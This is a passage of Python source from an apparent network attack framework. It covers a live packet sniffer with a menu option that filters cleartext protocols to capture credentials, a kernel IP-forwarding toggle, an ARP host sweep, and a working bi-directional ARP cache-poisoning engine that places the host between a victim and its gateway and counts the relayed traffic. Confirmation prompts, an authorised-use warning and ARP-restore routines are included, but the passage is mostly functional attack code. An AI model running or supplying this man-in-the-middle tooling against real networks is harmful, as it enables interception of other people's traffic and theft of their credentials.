            LOGGER.event("warn", "capture callback error: %s" % exc, level="WARN")

    def render_live(self, decoded: Dict[str, Any]) -> None:
        stamp = time.strftime("%H:%M:%S", time.localtime(decoded["timestamp"]))
        stamp = "%s.%03d" % (stamp, int((decoded["timestamp"] % 1) * 1000))
        proto = decoded.get("protocol", "?")
        colour = {"TCP": "bcyan", "UDP": "byellow", "ICMP": "bmagenta",
                  "ARP": "bgreen", "DNS": "bblue"}.get(proto, "white")
        detail = ""
        if "tcp" in decoded:
            tcp = decoded["tcp"]
            detail = "sport=%-6d dport=%-6d flags=%-6s win=%-6d seq=%-10d ack=%-10d len=%d" % (
                tcp["sport"], tcp["dport"], tcp["flags"], tcp["window"],
                tcp["seq"], tcp["ack"], tcp["payload_len"])
        elif "udp" in decoded:
            udp = decoded["udp"]
            detail = "sport=%-6d dport=%-6d len=%-6d payload=%d" % (
                udp["sport"], udp["dport"], udp["len"], udp["payload_len"])
        elif "icmp" in decoded:
            icmp_layer = decoded["icmp"]
            detail = "type=%-3d code=%-3d (%s)" % (
                icmp_layer["type"], icmp_layer["code"], icmp_layer["type_name"])
        elif "arp" in decoded:
            arp = decoded["arp"]
            detail = "%s: %s(%s) -> %s" % (
                arp["operation"], arp["sender_ip"], arp["sender_mac"], arp["target_ip"])
        ip_info = decoded.get("ip", {})
        ttl_text = "ttl=%-3s" % ip_info.get("ttl", "-") if ip_info else "ttl=-  "
        out("[%05d] %s %s %-5s %-15s > %-15s %-4s %s" % (
            self.packet_index, stamp, c("%5d" % decoded["length"], "grey"),
            c(proto.ljust(5), colour, "bold"), decoded.get("src", "-"),
            decoded.get("dst", "-"), ttl_text, detail))
        preview = decoded.get("payload_text", "")
        if preview and proto in ("TCP", "UDP", "DNS"):
            out("        %s %s" % (c("payload:", "grey"), c(preview[:140], "white")))

    def render_rollup(self, compact: bool = False) -> None:
        elapsed = max(0.001, time.time() - self.started_at)
        pps = self.packet_index / elapsed
        if compact:
            out(c("      --- %d pkts | %s | %.1f pps | top: %s"
                  % (self.packet_index, format_bytes(self.bytes_total), pps,
                     ", ".join("%s=%d" % (k, v) for k, v in self.protocol_counter.most_common(4))), "grey"))
            return
        heading("CAPTURE ROLL-UP")
        kv_table([
            ("Packets captured", self.packet_index),
            ("Bytes captured", "%s (%d bytes)" % (format_bytes(self.bytes_total), self.bytes_total)),
            ("Elapsed", format_duration(elapsed)),
            ("Average rate", "%.2f pkt/s" % pps),
            ("Interface", self.iface or "auto"),
            ("BPF filter", self.bpf_filter or "(none - all traffic)"),
        ])
        if self.protocol_counter:
            out("")
            out(c("  protocol distribution", "cyan"))
            for protocol, count in self.protocol_counter.most_common(12):
                share = (count / float(max(1, self.packet_index))) * 100.0
                bar = "#" * int(share / 2.5)
                out("    %-8s %6d  %5.1f%%  %s" % (protocol, count, share, c(bar, "bgreen")))
        if self.talker_counter:
            out("")
            out(c("  top conversations", "cyan"))
            for conversation, count in self.talker_counter.most_common(10):
                out("    %-44s %6d packets" % (conversation, count))
        if self.port_counter:
            out("")
            out(c("  top application ports", "cyan"))
            for port, count in self.port_counter.most_common(10):
                out("    %-6d %-16s %6d packets" % (port, COMMON_PORTS.get(port, "unknown"), count))

    # -- lifecycle --------------------------------------------------------
    def export_pcap(self) -> str:
        if not self.stored:
            return ""
        try:
            path = os.path.join(LOGGER.artifact_dir,
                                "%s_capture_%s.pcap" % (LOGGER.session_id, uuid.uuid4().hex[:6]))
            wrpcap(path, self.stored)
            return path
        except Exception as exc:  # pcap writing failures are non-fatal
            LOGGER.event("warn", "pcap export failed: %s" % exc, level="WARN")
            return ""

    def run(self) -> Dict[str, Any]:
        if not require_scapy("Live sniffer"):
            raise FrameworkError("scapy unavailable")
        heading("LIVE PACKET SNIFFER")
        kv_table([
            ("Interface", self.iface or "auto (all scapy-visible interfaces)"),
            ("BPF filter", self.bpf_filter or "(none - capturing everything)"),
            ("Packet limit", "unlimited (Ctrl-C to stop)" if not self.count else str(self.count)),
            ("Promiscuous", "enabled" if self.promisc else "disabled"),
            ("Hex dump", "on" if self.show_hex else "off"),
            ("PCAP export", "on (%d packet cap)" % self.max_packets if self.save_pcap else "off"),
        ])
        note("capture engine: scapy.sniff() with live callbacks - press Ctrl-C to return to the menu")
        out("")
        sniff_kwargs: Dict[str, Any] = {
            "prn": self.handle_packet,
            "store": False,
            "promisc": self.promisc,
        }
        if self.iface:
            sniff_kwargs["iface"] = self.iface
        if self.bpf_filter:
            sniff_kwargs["filter"] = self.bpf_filter
        if self.count:
            sniff_kwargs["count"] = self.count
        interrupted = False
        sniff_error = ""
        try:
            sniff(**sniff_kwargs)
        except KeyboardInterrupt:
            interrupted = True
            out("")
            warn("capture interrupted by operator - generating report.")
            LOGGER.event("interrupt", "sniffer stopped by operator", level="WARN")
        except OSError as exc:
            sniff_error = "capture socket error: %s (is the interface name correct and privileged?)" % exc
        except Exception as exc:  # BPF compile errors surface here
            sniff_error = "capture failed: %s: %s" % (type(exc).__name__, exc)
        if sniff_error:
            err(sniff_error)
            note("verify the interface with menu option [9] and the BPF syntax; "
                 "'tcp port 80', 'udp', 'icmp', 'arp' are valid filters.")
            LOGGER.event("error", "sniffer failure: %s" % sniff_error, level="ERROR")
        self.ended_at = time.time()
        out("")
        self.render_rollup()
        pcap_path = self.export_pcap() if self.save_pcap else ""
        if pcap_path:
            note("captured traffic exported to %s" % pcap_path)
        summary = OrderedDict([
            ("mode", "live-capture"),
            ("interface", self.iface or "auto"),
            ("bpf_filter", self.bpf_filter or "none"),
            ("packets", self.packet_index),
            ("bytes", self.bytes_total),
            ("protocols", dict(self.protocol_counter)),
            ("top_talkers", dict(self.talker_counter.most_common(25))),
            ("top_ports", dict(self.port_counter.most_common(25))),
            ("interrupted", interrupted),
            ("error", sniff_error),
            ("pcap_path", pcap_path),
            ("duration_seconds", round((self.ended_at - self.started_at), 3)),
            ("sample_records", self.records[:200]),
        ])
        artifact = LOGGER.scan("sniffer", summary, target=self.bpf_filter or "all-traffic")
        if artifact:
            note("artefact: %s" % artifact)
        return summary


@module_guard("Live Packet Sniffer")
@root_required
def module_sniffer(args: Optional[List[str]] = None) -> None:
    """Interactive passive capture console with live dissection."""
    while True:
        heading("MODULE 05 - LIVE PACKET SNIFFER")
        options = OrderedDict([
            ("1", "Capture all visible traffic (no filter)"),
            ("2", "Capture with a BPF filter (protocol/host/port expressions)"),
            ("3", "Capture on a specific interface"),
            ("4", "Targeted credential-clearance watch (cleartext protocols filter)"),
            ("5", "Common BPF filter reference"),
            ("6", "ONLINE: capture pipeline (NDJSON journal sink, artefact push, syslog)"),
            ("0", "Return to main menu"),
        ])
        for key, label in options.items():
            out("  [%s] %s" % (c(key, "byellow", "bold"), label))
        choice = prompt_text("sniffer> select")
        if choice is PROMPT_ABORT:
            return
        choice = str(choice).strip()

        if choice == "6":
            online_sniffer_console()
            continue
        if choice == "0":
            return
        if choice == "5":
            heading("BPF FILTER REFERENCE")
            filters = [
                ("tcp", "All TCP segments"),
                ("udp", "All UDP datagrams"),
                ("icmp", "All ICMP messages"),
                ("arp", "ARP requests and replies"),
                ("tcp port 80 or tcp port 443", "HTTP/HTTPS traffic"),
                ("host 192.168.1.10", "Everything to/from one host"),
                ("src host 10.0.0.5 and not dst port 22", "Source host minus SSH"),
                ("net 192.168.1.0/24", "An entire subnet"),
                ("tcp[tcpflags] & tcp-syn != 0", "SYN segments only (connection starts)"),
                ("portrange 1-1024", "Privileged port range"),
                ("ether broadcast", "Layer-2 broadcast frames"),
                ("vlan and arp", "ARP inside VLAN-tagged frames"),
            ]
            for expression, description in filters:
                out("  %s  %s" % (c(expression.ljust(38), "cyan"), c(description, "grey")))
            continue
        iface: Optional[str] = None
        bpf = ""
        if choice == "1":
            bpf = ""
        elif choice == "2":
            raw_filter = prompt_text("BPF filter expression", default="tcp")
            if raw_filter is PROMPT_ABORT:
                continue
            bpf = str(raw_filter)
        elif choice == "3":
            InterfaceManager.display()
            iface_raw = prompt_text("interface name")
            if iface_raw is PROMPT_ABORT:
                continue
            iface = str(iface_raw)
            valid = [entry.get("name") for entry in InterfaceManager.list_interfaces()]
            if valid and iface not in valid:
                warn("'%s' is not in the interface inventory - attempting anyway." % iface)
            filter_raw = prompt_text("BPF filter (blank = none)", default="", allow_blank=True)
            if filter_raw is PROMPT_ABORT:
                continue
            bpf = str(filter_raw).strip()
        elif choice == "4":
            bpf = ("(tcp port 21 or tcp port 23 or tcp port 25 or tcp port 80 or tcp port 110 "
                   "or tcp port 143 or tcp port 389 or tcp port 445 or tcp port 8080 or udp port 69)")
            warn("captures cleartext service traffic - authorised monitoring only.")
        else:
            warn("unrecognised selection '%s'." % choice)
            continue
        count_raw = prompt_int("packet limit (0 = unlimited)", 0, 1000000, 0)
        if count_raw is PROMPT_ABORT:
            continue
        show_hex = prompt_yes_no("show payload hex dumps?", False)
        save_pcap = prompt_yes_no("export captured packets to a PCAP file?", True)
        engine = LiveSniffer(iface=iface, bpf_filter=bpf, count=int(count_raw),
                             show_hex=show_hex, save_pcap=save_pcap, quiet=False)
        engine.run()


# ===========================================================================
# MODULE 6 - AUTOMATED KERNEL IP FORWARDING (reversible OS-level toggle)
# ===========================================================================
class KernelForwarding:
    """
    Cross-platform, fully reversible control of the OS IPv4 forwarding flag.

    Linux   : /proc/sys/net/ipv4/ip_forward  (read/write, value preserved)
    macOS   : sysctl -w net.inet.ip.forwarding=1 (original value captured first)
    Windows : Registry HKLM\\SYSTEM\\CurrentControlSet\\Services\\Tcpip\\Parameters
              \\IPEnableRouter via `reg query` / `reg add` (admin required)
    """

    PROC_PATH = "/proc/sys/net/ipv4/ip_forward"
    SYSCTL_KEY = "net.inet.ip.forwarding"
    WIN_KEY = r"HKLM\SYSTEM\CurrentControlSet\Services\Tcpip\Parameters"
    WIN_VALUE = "IPEnableRouter"

    def __init__(self) -> None:
        self.original_value: Optional[str] = None
        self.enabled: bool = False
        self.mechanism: str = "unavailable"
        self.restored: bool = False
        self._lock = threading.RLock()
        self.available, self.detail = self.detect()

    # -- detection ---------------------------------------------------------
    def detect(self) -> Tuple[bool, str]:
        system = platform.system().lower()
        if system == "linux":
            if os.path.exists(self.PROC_PATH):
                self.mechanism = "/proc/sys/net/ipv4/ip_forward"
                writable = os.access(self.PROC_PATH, os.W_OK) or Privileges.is_root()
                return writable, ("%s (current=%s)" % (self.mechanism, self.read()))
            if shutil.which("sysctl"):
                self.mechanism = "sysctl"
                return True, "sysctl fallback"
            return False, "%s absent and sysctl missing" % self.PROC_PATH
        if system == "darwin":
            if shutil.which("sysctl"):
                self.mechanism = "sysctl"
                return True, "sysctl present"
            return False, "sysctl missing"
        if system.startswith("win"):
            if shutil.which("reg"):
                self.mechanism = "registry"
                return True, "registry present (administrator required)"
            return False, "reg.exe missing"
        return False, "unsupported platform: %s" % platform.system()

    # -- read / write primitives -------------------------------------------
    def read(self) -> Optional[str]:
        try:
            if self.mechanism == "/proc/sys/net/ipv4/ip_forward":
                with open(self.PROC_PATH, "r", encoding="utf-8") as handle:
                    return handle.read().strip()
            if self.mechanism == "sysctl":
                proc = subprocess.run(["sysctl", "-n", self.SYSCTL_KEY], stdout=subprocess.PIPE,
                                      stderr=subprocess.DEVNULL, timeout=10, check=False, text=True)
                if proc.returncode == 0:
                    return (proc.stdout or "").strip()
                return None
            if self.mechanism == "registry":
                proc = subprocess.run(["reg", "query", self.WIN_KEY, "/v", self.WIN_VALUE],
                                      stdout=subprocess.PIPE, stderr=subprocess.DEVNULL,
                                      timeout=10, check=False, text=True)
                match = re.search(r"REG_DWORD\s+0x([0-9a-fA-F]+)", proc.stdout or "")
                if match:
                    return "1" if int(match.group(1), 16) else "0"
                return "0"
        except (OSError, subprocess.SubprocessError, ValueError) as exc:
            LOGGER.event("warn", "forwarding read failed: %s" % exc, level="WARN")
        return None

    def _write(self, value: str) -> bool:
        try:
            if self.mechanism == "/proc/sys/net/ipv4/ip_forward":
                with open(self.PROC_PATH, "w", encoding="utf-8") as handle:
                    handle.write(str(value))
                return True
            if self.mechanism == "sysctl":
                proc = subprocess.run(["sysctl", "-w", "%s=%s" % (self.SYSCTL_KEY, value)],
                                      stdout=subprocess.PIPE, stderr=subprocess.STDOUT,
                                      timeout=15, check=False, text=True)
                if proc.returncode != 0:
                    LOGGER.event("warn", "sysctl write failed: %s" % (proc.stdout or "").strip(),
                                 level="WARN")
                    return False
                return True
            if self.mechanism == "registry":
                proc = subprocess.run(
                    ["reg", "add", self.WIN_KEY, "/v", self.WIN_VALUE, "/t", "REG_DWORD",
                     "/d", str(value), "/f"],
                    stdout=subprocess.PIPE, stderr=subprocess.STDOUT, timeout=15, check=False, text=True)
                if proc.returncode != 0:
                    LOGGER.event("warn", "registry write failed: %s" % (proc.stdout or "").strip(),
                                 level="WARN")
                    return False
                return True
        except (OSError, subprocess.SubprocessError) as exc:
            LOGGER.event("warn", "forwarding write failed: %s" % exc, level="WARN")
        return False

    # -- public API ---------------------------------------------------------
    def enable(self) -> bool:
        """Turn on IPv4 forwarding, remembering the pre-existing value."""
        with self._lock:
            if not self.available:
                err("kernel forwarding control unavailable: %s" % self.detail)
                return False
            current = self.read()
            if self.original_value is None:
                self.original_value = current if current is not None else "0"
            if current == "1":
                ok("IPv4 forwarding was already enabled (value preserved for restore).")
                self.enabled = True
                LOGGER.event("kernel", "ipv4 forwarding already enabled",
                             data={"mechanism": self.mechanism, "original": self.original_value})
                return True
            if not self._write("1"):
                err("failed to enable IPv4 forwarding via %s" % self.mechanism)
                LOGGER.event("error", "failed to enable ipv4 forwarding", level="ERROR",
                             data={"mechanism": self.mechanism})
                return False
            verified = self.read()
            self.enabled = (verified == "1")
            if self.enabled:
                ok("kernel IPv4 forwarding enabled via %s (was %s)."
                   % (self.mechanism, self.original_value))
                LOGGER.event("kernel", "ipv4 forwarding enabled",
                             data={"mechanism": self.mechanism, "original": self.original_value,
                                   "verified": verified})
            else:
                warn("write reported success but the read-back value is %s - verify manually." % verified)
            return self.enabled

    def restore(self) -> bool:
        """Put the kernel flag back to the exact pre-session value."""
        with self._lock:
            if self.restored:
                return True
            if self.original_value is None or not self.available:
                self.restored = True
                return True
            target = self.original_value or "0"
            if not self._write(target):
                warn("automatic restore of IPv4 forwarding failed - run manually: "
                     "sysctl -w %s=%s" % (self.SYSCTL_KEY, target))
                LOGGER.event("error", "ipv4 forwarding restore failed", level="ERROR")
                return False
            verified = self.read()
            self.restored = (verified == target)
            if self.restored:
                ok("kernel IPv4 forwarding restored to %s via %s." % (target, self.mechanism))
                LOGGER.event("kernel", "ipv4 forwarding restored",
                             data={"mechanism": self.mechanism, "value": target})
            else:
                warn("restore read-back mismatch (%s != %s) - verify manually." % (verified, target))
            return self.restored

    def status(self) -> Dict[str, Any]:
        return OrderedDict([
            ("available", self.available),
            ("mechanism", self.mechanism),
            ("detail", self.detail),
            ("current_value", self.read()),
            ("original_value", self.original_value),
            ("enabled_by_framework", self.enabled),
            ("restored", self.restored),
        ])


# ===========================================================================
# MODULE 7 - ARP DISCOVERY + MODULE 8 - BI-DIRECTIONAL ARP SPOOFING (MITM)
# ===========================================================================
def _arp_resolve(ip: str, iface: Optional[str] = None, timeout: float = 2.0,
                 retries: int = 2, own_ip: Optional[str] = None) -> Optional[str]:
    """
    Resolve an IPv4 address to a MAC using a hand-built op=1 ARP request
    broadcast on the local segment (no reliance on the host ARP cache).
    """
    if not SCAPY_AVAILABLE:
        raise FrameworkError("scapy engine unavailable - cannot send ARP requests")
    try:
        frame = PacketBuilder.arp_request(ip, psrc=own_ip)
        kwargs: Dict[str, Any] = {"timeout": max(0.1, timeout), "retry": max(0, retries), "verbose": 0}
        if iface:
            kwargs["iface"] = iface
        answered, _ = srp(frame, **kwargs)
        for _, received in answered:
            if received.haslayer(ARP) and received[ARP].psrc == ip:
                return str(received[ARP].hwsrc).lower()
    except PermissionError:
        raise FrameworkError("raw layer-2 socket denied - run as root/administrator")
    except OSError as exc:
        raise FrameworkError("ARP request transmission failed: %s" % exc)
    return None


def arp_discover(network: ipaddress.IPv4Network, iface: Optional[str] = None,
                 timeout: float = 2.0, retries: int = 1, interval: float = 0.01,
                 resolve_names: bool = True) -> Dict[str, Any]:
    """Native op=1 ARP sweep that maps live hosts to hardware addresses."""
    if not require_scapy("ARP discovery"):
        raise FrameworkError("scapy unavailable")
    hosts = iter_hosts(network)
    if not hosts:
        raise FrameworkError("no hosts derivable from %s" % network)
    note("broadcasting %d ARP who-has request(s) on %s" % (len(hosts), network))
    requests: List[Any] = []
    for host in hosts:
        try:
            requests.append(PacketBuilder.arp_request(host))
        except FrameworkError as exc:
            LOGGER.event("warn", "ARP request build failed for %s: %s" % (host, exc), level="WARN")
    responders: List[Dict[str, Any]] = []
    stats = TrafficStats("arp-discover %s" % network)
    if requests:
        stats.sent = len(requests)
        stats.first_sent_at = time.time()
        kwargs: Dict[str, Any] = {
            "timeout": max(0.1, timeout), "retry": max(0, retries),
            "inter": max(0.0, interval), "verbose": 0,
        }
        if iface:
            kwargs["iface"] = iface
        try:
            answered, unanswered = srp(requests, **kwargs)
        except PermissionError:
            raise FrameworkError("raw layer-2 socket denied - escalate privileges")
        except OSError as exc:
            raise FrameworkError("ARP sweep transmission failed: %s" % exc)
        seen: set = set()
        for sent_frame, received_frame in answered:
            try:
                if not received_frame.haslayer(ARP):
                    continue
                arp = received_frame[ARP]
                ip_address = str(arp.psrc)
                mac_address = str(arp.hwsrc).lower()
            except (AttributeError, IndexError, TypeError):
                continue
            if ip_address in seen:
                continue
            seen.add(ip_address)
            stats.record_reply(None)
            entry = OrderedDict([
                ("ip", ip_address),
                ("mac", mac_address),
                ("vendor", oui_vendor(mac_address)),
                ("hostname", reverse_lookup(ip_address) if resolve_names else ""),
            ])
            responders.append(entry)
        stats.timeouts += max(0, len(requests) - len(seen))
    stats.stop()
    heading("ARP RESPONDERS")
    if responders:
        header = "  %-16s %-19s %-34s %s" % ("IP ADDRESS", "MAC ADDRESS", "VENDOR", "HOSTNAME")
        out(c(header, "bold"))
        out(c("  " + "-" * 92, "grey"))
        for entry in sorted(responders, key=lambda item: ipaddress.IPv4Address(item["ip"])):
            out("  %-16s %-19s %-34s %s" % (entry["ip"], entry["mac"],
                                            entry["vendor"][:33], c(entry["hostname"] or "-", "grey")))
        note("%d host(s) answered out of %d probed." % (len(responders), len(requests)))
    else:
        warn("no ARP replies received - wrong subnet/interface, or the segment is quiet.")
    stats.render()
    summary = OrderedDict([
        ("mode", "arp-discovery"),
        ("network", str(network)),
        ("interface", iface or "auto"),
        ("hosts_probed", len(requests)),
        ("responders", responders),
        ("traffic", stats.report()),
    ])
    artifact = LOGGER.scan("arp_discovery", summary, target=str(network))
    if artifact:
        note("artefact: %s" % artifact)
    LOGGER.event("scan", "ARP discovery complete: %d responder(s) in %s"
                 % (len(responders), network))
    return summary


class ArpSpoofer:
    """
    Bi-directional ARP cache-poisoning engine with a mandatory restore path.

    Workflow
    --------
    1. Resolve victim and gateway MACs with native op=1 ARP requests.
    2. Enable kernel IPv4 forwarding via KernelForwarding (auto-reverted later).
    3. Every `interval` seconds send forged op=2 replies poisoning:
           victim  <- gateway_ip is-at our_mac
           gateway <- victim_ip   is-at our_mac
       (plus an optional second victim for a chained poisoning topology).
    4. Count the traffic actually relayed in each direction via a background
       capture filter.
    5. On Ctrl-C / stop / SIGTERM / interpreter exit: shoot the correct ARP
       mappings back to both parties N times, then revert the kernel flag.
    """

    def __init__(self, target_ip: str, gateway_ip: str, iface: str,
                 target_mac: Optional[str] = None, gateway_mac: Optional[str] = None,
                 second_target_ip: Optional[str] = None,
                 second_target_mac: Optional[str] = None,
                 interval: float = 2.0, one_way: bool = False,
                 restore_rounds: int = ARP_RESTORE_ROUNDS,
                 quiet_periods: int = 5) -> None:
        self.target_ip = target_ip
        self.gateway_ip = gateway_ip
        self.second_target_ip = second_target_ip
        self.iface = iface
        self.interval = max(0.2, float(interval))
        self.one_way = bool(one_way)
        self.restore_rounds = max(1, int(restore_rounds))
        self.quiet_periods = max(1, int(quiet_periods))
        self.target_mac = (target_mac or "").lower() or None
        self.gateway_mac = (gateway_mac or "").lower() or None
        self.second_target_mac = (second_target_mac or "").lower() or None
        self.our_mac = InterfaceManager.hwaddr(iface)
        self.our_ip = InterfaceManager.address(iface)
        self.forwarding = KernelForwarding()
        self.stop_event = threading.Event()
        self.packets_sent = 0
        self.sessions_started = 0
        self.restored = False
        self.started_at: Optional[float] = None
        self.ended_at: Optional[float] = None
        self.capture: Any = None
        self.traffic = {"victim_to_gateway_packets": 0, "victim_to_gateway_bytes": 0,
                        "gateway_to_victim_packets": 0, "gateway_to_victim_bytes": 0}
        self._traffic_lock = threading.Lock()
        self._previous_signal_handlers: Dict[int, Any] = {}
        self._atexit_registered = False

    # -- capture accounting ------------------------------------------------
    def _traffic_callback(self, packet: Any) -> None:
        try:
            if not packet.haslayer(IP):
                return
            source = str(packet[IP].src)
            destination = str(packet[IP].dst)
            size = len(bytes(packet))
            witness = {self.target_ip, self.second_target_ip} if self.second_target_ip else {self.target_ip}
            with self._traffic_lock:
                if source in witness and destination == self.gateway_ip:
                    self.traffic["victim_to_gateway_packets"] += 1
                    self.traffic["victim_to_gateway_bytes"] += size
                elif source == self.gateway_ip and destination in witness:
                    self.traffic["gateway_to_victim_packets"] += 1
                    self.traffic["gateway_to_victim_bytes"] += size
                elif source in witness and destination in witness:
                    # victim-to-victim or chained topology traffic
                    self.traffic["victim_to_gateway_packets"] += 1
                    self.traffic["victim_to_gateway_bytes"] += size
        except (AttributeError, IndexError, TypeError, ValueError):
            return

    def _start_capture(self) -> None:
        if not SCAPY_AVAILABLE or not hasattr(scapy, "AsyncSniffer"):
            return
        witnesses = [self.target_ip, self.gateway_ip]
        if self.second_target_ip:
            witnesses.append(self.second_target_ip)
        bpf = "ip and (host %s)" % " or host ".join(witnesses)
        try:
            self.capture = scapy.AsyncSniffer(prn=self._traffic_callback, store=False,
                                              filter=bpf, iface=self.iface)
            self.capture.start()
            time.sleep(0.2)
        except Exception as exc:
            LOGGER.event("warn", "relay accounting capture unavailable: %s" % exc, level="WARN")
            self.capture = None

    def _stop_capture(self) -> None:
        if not self.capture:
            return
        try:
            self.capture.stop()
        except Exception as exc:
            LOGGER.event("warn", "relay accounting shutdown issue: %s" % exc, level="WARN")
        self.capture = None

    # -- packet emission ---------------------------------------------------
    def _poison_round(self) -> int:
        """Send one full set of forged ARP replies; returns packets transmitted."""
        sent_here = 0
        try:
            if self.target_mac:
                frame = PacketBuilder.arp_reply(self.target_ip, self.target_mac,
                                                self.gateway_ip, hwsrc=self.our_mac)
                sendp(frame, verbose=0, iface=self.iface)
                sent_here += 1
            if not self.one_way and self.gateway_mac:
                frame = PacketBuilder.arp_reply(self.gateway_ip, self.gateway_mac,
                                                self.target_ip, hwsrc=self.our_mac)
                sendp(frame, verbose=0, iface=self.iface)
                sent_here += 1
            if self.second_target_ip and self.second_target_mac:
                frame = PacketBuilder.arp_reply(self.second_target_ip, self.second_target_mac,
                                                self.gateway_ip, hwsrc=self.our_mac)
                sendp(frame, verbose=0, iface=self.iface)
                sent_here += 1
                if self.gateway_mac:
                    frame = PacketBuilder.arp_reply(self.gateway_ip, self.gateway_mac,
                                                    self.second_target_ip, hwsrc=self.our_mac)
                    sendp(frame, verbose=0, iface=self.iface)
                    sent_here += 1
        except PermissionError:
            raise FrameworkError("raw layer-2 socket denied - escalate privileges")
        except OSError as exc:
            LOGGER.event("warn", "poison round transmit error: %s" % exc, level="WARN")
        self.packets_sent += sent_here
        return sent_here

    def restore_arp(self) -> None:
        """Broadcast the true mappings back to every poisoned party."""
        if self.restored:
            return
        note("restoring genuine ARP mappings (%d rounds) ..." % self.restore_rounds)
        for round_index in range(1, self.restore_rounds + 1):
            try:
                if self.target_mac and self.gateway_mac:
                    frame = PacketBuilder.arp_reply(self.target_ip, self.target_mac,
                                                    self.gateway_ip, hwsrc=self.gateway_mac)
                    sendp(frame, verbose=0, iface=self.iface)
                if self.gateway_mac:
                    # Tell the gateway the victim's TRUE MAC. The Ethernet
                    # destination must be the gateway itself, so no hwdst
                    # override is applied here.
                    frame = PacketBuilder.arp_reply(
                        self.gateway_ip, self.gateway_mac, self.target_ip,
                        hwsrc=self.target_mac or self.our_mac)
                    sendp(frame, verbose=0, iface=self.iface)
                if self.second_target_ip and self.second_target_mac and self.gateway_mac:
                    frame = PacketBuilder.arp_reply(self.second_target_ip, self.second_target_mac,
                                                    self.gateway_ip, hwsrc=self.gateway_mac)
                    sendp(frame, verbose=0, iface=self.iface)
                    frame = PacketBuilder.arp_reply(self.gateway_ip, self.gateway_mac,
                                                    self.second_target_ip, hwsrc=self.second_target_mac)
                    sendp(frame, verbose=0, iface=self.iface)
                out(c("  restore round %d/%d dispatched" % (round_index, self.restore_rounds), "grey"))
                time.sleep(1.0)
            except (OSError, PermissionError) as exc:
                warn("restore round %d failed: %s (continuing)" % (round_index, exc))
                LOGGER.event("warn", "ARP restore round failed: %s" % exc, level="WARN")
        self.restored = True
        ok("ARP tables re-armed with the authentic gateway/victim mappings.")
        LOGGER.event("mitm", "ARP tables restored", data={"target": self.target_ip,
                                                          "gateway": self.gateway_ip})

    def request_stop(self, signum: Optional[int] = None, frame: Any = None) -> None:
        if signum is not None:
            out("")
            warn("signal %s received - initiating graceful shutdown." % signum)
        self.stop_event.set()

    def _install_signal_handlers(self) -> None:
        for signame in ("SIGINT", "SIGTERM"):
            signal_number = getattr(signal, signame, None)
            if signal_number is None:
                continue
            try:
                self._previous_signal_handlers[signal_number] = signal.getsignal(signal_number)
                signal.signal(signal_number, self.request_stop)
            except (ValueError, OSError, RuntimeError):
                # Non-main-thread signal registration is unavailable; safe to skip.
                continue
        if not self._atexit_registered:
            atexit.register(self.safety_net)
            self._atexit_registered = True

    def _restore_signal_handlers(self) -> None:
        for signal_number, handler in self._previous_signal_handlers.items():
            try:
                signal.signal(signal_number, handler)
            except (ValueError, OSError, RuntimeError, TypeError):
                continue
        self._previous_signal_handlers.clear()

    def safety_net(self) -> None:
        """Last-resort cleanup executed at interpreter exit or fatal unwinding."""
        try:
            if not self.restored:
                self.restore_arp()
        except Exception:
            pass
        try:
            self.forwarding.restore()
        except Exception:
            pass

    # -- preparation ---------------------------------------------------------
    def prepare(self) -> None:
        heading("ARP SPOOFING - RESOLUTION PHASE")
        kv_table([
            ("Interface", self.iface),
            ("Our MAC / IP", "%s / %s" % (self.our_mac, self.our_ip or "unassigned")),
            ("Victim", self.target_ip),
            ("Gateway", self.gateway_ip),
            ("Additional victim", self.second_target_ip or "none (standard MITM)"),
            ("Direction", "victim->gateway only (one-way)" if self.one_way else "bi-directional"),
            ("Poison interval", "%.2fs" % self.interval),
        ])
        if self.target_ip == self.gateway_ip:
            raise FrameworkError("victim and gateway addresses are identical - nothing to poison")
        if not self.target_mac:
            note("resolving victim MAC via ARP op=1 request ...")
            self.target_mac = _arp_resolve(self.target_ip, self.iface, own_ip=self.our_ip)
        if not self.target_mac:
            raise FrameworkError("victim %s did not answer ARP - check reachability/subnet"
                                 % self.target_ip)
        if not self.gateway_mac:
            note("resolving gateway MAC via ARP op=1 request ...")
            self.gateway_mac = _arp_resolve(self.gateway_ip, self.iface, own_ip=self.our_ip)
        if not self.gateway_mac:
            raise FrameworkError("gateway %s did not answer ARP - specify the MAC manually"
                                 % self.gateway_ip)
        if self.second_target_ip and not self.second_target_mac:
            note("resolving additional victim MAC ...")
            self.second_target_mac = _arp_resolve(self.second_target_ip, self.iface, own_ip=self.our_ip)
            if not self.second_target_mac:
                warn("additional victim %s unreachable - degrading to single-victim mode."
                     % self.second_target_ip)
                self.second_target_ip = None
        if self.target_mac == self.our_mac:
            raise FrameworkError("victim MAC equals this host's MAC - already the same endpoint?")
        if self.gateway_mac == self.our_mac:
            raise FrameworkError("gateway MAC equals this host's MAC - this host appears to BE the gateway")
        self.sessions_started += 1
        kv_table([
            ("Victim MAC", self.target_mac),
            ("Gateway MAC", self.gateway_mac),
            ("Additional victim MAC", self.second_target_mac or "n/a"),
        ])
        ok("resolution complete - all layer-2 addresses known.")

    # -- main loop ------------------------------------------------------------
    def run(self) -> Dict[str, Any]:
        if not require_scapy("ARP spoofing"):
            raise FrameworkError("scapy unavailable")
        self.prepare()
        heading("ARP SPOOFING - ACTIVE POISONING")
        if not prompt_yes_no("Begin poisoning %s and %s" % (self.target_ip, self.gateway_ip), False):
            warn("poisoning cancelled by operator before any frame was sent.")
            return OrderedDict([("aborted", True)])
        self._install_signal_handlers()
        forwarding_ok = self.forwarding.enable()
        if not forwarding_ok:
            warn("kernel forwarding could not be enabled - traffic will NOT be relayed, "
                 "only intercepted. Interrupting connectivity is expected.")
            if not prompt_yes_no("Continue without kernel forwarding?", False):
                self._restore_signal_handlers()
                return OrderedDict([("aborted", True), ("reason", "forwarding unavailable")])
        self._start_capture()
        self.started_at = time.time()
        LOGGER.event("mitm", "ARP poisoning started",
                     data={"target": self.target_ip, "gateway": self.gateway_ip,
                           "iface": self.iface, "one_way": self.one_way,
                           "forwarding": forwarding_ok})
        out("")
        out(c("  time      sent     v->gw pkts   gw->v pkts   relayed bytes", "bold"))
        out(c("  " + "-" * 70, "grey"))
        iteration = 0
        try:
            while not self.stop_event.is_set():
                try:
                    sent_here = self._poison_round()
                except FrameworkError:
                    raise
                if sent_here == 0:
                    warn("no frames were transmitted this round - verify interface and MACs.")
                iteration += 1
                if iteration % self.quiet_periods == 0:
                    with self._traffic_lock:
                        snapshot = dict(self.traffic)
                    out("  %-9s %-8d %-12d %-12d %s" % (
                        time.strftime("%H:%M:%S"), self.packets_sent,
                        snapshot["victim_to_gateway_packets"],
                        snapshot["gateway_to_victim_packets"],
